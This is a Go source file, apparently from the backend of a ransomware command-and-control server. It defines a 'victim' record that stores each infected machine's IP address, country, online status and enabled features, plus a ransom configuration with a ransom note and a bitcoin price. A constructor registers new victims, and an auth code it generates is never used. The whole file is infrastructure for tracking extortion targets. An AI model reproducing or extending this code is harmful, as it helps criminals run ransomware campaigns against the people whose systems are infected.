package Victim

import (
	"crypto/rand"

	"github.com/google/uuid"
	"server.com/src/utils"
)

type VictimOptions struct {
	RansomConfig struct {
		RansomNote   string  `bson:"ransom_note,omitempty"`
		BitcoinPrice float64 `bson:"bitcoin_price,omitempty"`
	} `bson:"ransom_config"`
}

type InternalVictim struct {
	Id              string          `bson:"_id" json:"id,omitempty"`
	Alias           string          `bson:"alias" json:"alias,omitempty"`
	IPAddress       string          `bson:"ip_address" json:"ip_address"`
	Options         VictimOptions   `bson:"options"`
	EnabledFeatures map[string]bool `bson:"enabled_features,omitempty"`
	Country         string          `bson:"country"`
	Online          bool            `bson:"online"`
	TreeID          string          `bson:"tree_id"`
}

func NewVictim(victim Victim, IPAddress string) (InternalVictim, error) {
	var authCodeBytes = make([]byte, utils.KEY_SIZE)

	if _, err := rand.Read(authCodeBytes); err != nil {
		return InternalVictim{}, err
	}

	newVictim := InternalVictim{
		Id:              uuid.NewString(),
		Alias:           victim.Alias,
		IPAddress:       IPAddress,
		Country:         victim.Country,
		EnabledFeatures: make(map[string]bool),
		Online:          victim.Online,
	}

	return newVictim, nil
}
